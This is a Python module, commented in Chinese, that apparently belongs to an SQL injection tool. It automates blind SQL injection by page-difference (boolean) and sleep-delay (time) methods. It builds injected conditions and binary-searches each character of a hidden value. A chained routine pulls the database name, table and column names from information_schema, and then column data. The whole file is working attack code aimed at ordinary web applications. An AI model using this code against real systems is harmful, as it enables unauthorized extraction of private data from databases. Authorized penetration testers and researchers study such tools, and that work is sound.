# -*- coding: utf-8 -*-
"""盲注自动化：布尔盲注（页面差异）与时间盲注（sleep 延迟）"""

import string
import time
from .utils import ok, info, warn, result

CHARSET = (string.ascii_lowercase + string.ascii_uppercase
           + string.digits + "_{}!@#$%^&*()-+=[]:;',.?/|~ ")


def _same(a, b, tol=0.05):
    if not a or not b:
        return False
    return abs(len(a) - len(b)) <= max(4, int(max(len(a), len(b)) * tol))


class BlindInjector:
    def __init__(self, http, point, closure, base_value,
                 mode="bool", sleep_time=3, fuzzy=False):
        self.http = http
        self.point = point
        self.cl = closure
        self.base = base_value
        self.mode = mode          # bool | time
        self.sleep_time = sleep_time
        self.tol = 0.15 if fuzzy else 0.05

        if mode == "bool":
            # 基准：恒真/恒假页面
            self.ref_true, _ = point.request(
                http, closure.bool_payload(base_value, True))
            self.ref_false, _ = point.request(
                http, closure.bool_payload(base_value, False))
            if not self.ref_true:
                raise RuntimeError("恒真页面无响应，检查注入点，"
                                   "或改用 --blind time")
            if _same(self.ref_true, self.ref_false, self.tol):
                warn("恒真/恒假页面过于相似，布尔判断可能不可靠")

    def _close(self, a, b):
        """与基准页面相似度判断（空串也参与比较）"""
        a, b = a or "", b or ""
        if a == b:
            return True
        la, lb = len(a), len(b)
        return abs(la - lb) <= max(4, int(max(la, lb, 4) * self.tol))

    def ask(self, expr):
        """expr: 不含引号的布尔表达式（用 hex()/数值比较规避字符串字面量）。
        返回 True/False；无法判定时按 False 处理"""
        p = self.cl.blind_payload(self.base, self._wrap(expr))
        text, elapsed = self.point.request(self.http, p)
        if "__HTTP_ERROR__" in text:
            return False
        if self.mode == "time":
            return elapsed >= self.sleep_time * 0.8
        if self._close(text, self.ref_false):
            return False
        return True

    def _wrap(self, expr):
        """时间盲注把条件包进 if(...,sleep(S),0)；布尔直接用"""
        if self.mode == "time":
            return f"if({expr},sleep({self.sleep_time}),0)"
        return expr

    def ask_str(self, subquery_expr, max_len=100):
        """对返回字符串的子查询做逐位二分猜解。返回猜解出的字符串"""
        out = []
        for pos in range(1, max_len + 1):
            ch = self._guess_char(subquery_expr, pos)
            if ch is None:
                break
            out.append(ch)
            print(f"\r    {subquery_expr[:40]} = {''.join(out)}"
                  f"{'' if len(out) < 2 else '  (' + str(len(out)) + ' 字符)'}   ",
                  end="", flush=True)
        print()
        val = "".join(out)
        if val:
            ok(f"猜解完成: {val}")
        else:
            warn("盲注未得到结果")
        return val

    def _guess_char(self, expr, pos):
        # 该位置无字符（超出长度）-> ascii 返回 NULL -> 条件为假
        if not self.ask(f"ascii(substr(({expr}),{pos},1))>0"):
            return None
        # 二分猜 ASCII 范围 [32,127]
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if self.ask(f"ascii(substr(({expr}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)

    def guess_length(self, expr):
        n = 0
        while n < 300 and self.ask(f"length(({expr}))>{n}"):
            n += 1
        return n


def blind_dump(http, point, closure, base, mode="bool", target="database()",
               sleep_time=3, verbose=True):
    """盲注提取一个标量值"""
    bi = BlindInjector(http, point, closure, base, mode=mode,
                       sleep_time=sleep_time)
    if verbose:
        info(f"盲注模式 [{mode}] 猜解: {target}")
    return bi.ask_str(target)


def blind_extract_chain(http, point, closure, base, mode="bool",
                        db=None, table=None, column=None, sleep_time=3):
    """按 库->表->列->数据 链条盲注提取"""
    results = {}
    if not db:
        db = blind_dump(http, point, closure, base, mode, "database()",
                        sleep_time)
        results["db"] = db
    if table is None:
        expr = ("select group_concat(table_name) from information_schema."
                "tables where table_schema=database()")
        results["tables"] = blind_dump(http, point, closure, base, mode,
                                       expr, sleep_time)
    elif column is None:
        expr = ("select group_concat(column_name) from information_schema."
                f"columns where table_name=0x{table.encode().hex()}")
        results["columns"] = blind_dump(http, point, closure, base, mode,
                                        expr, sleep_time)
    else:
        src = f"{db}.{table}" if db else table
        expr = f"select group_concat({column}) from {src}"
        results["data"] = blind_dump(http, point, closure, base, mode,
                                     expr, sleep_time)
    return results
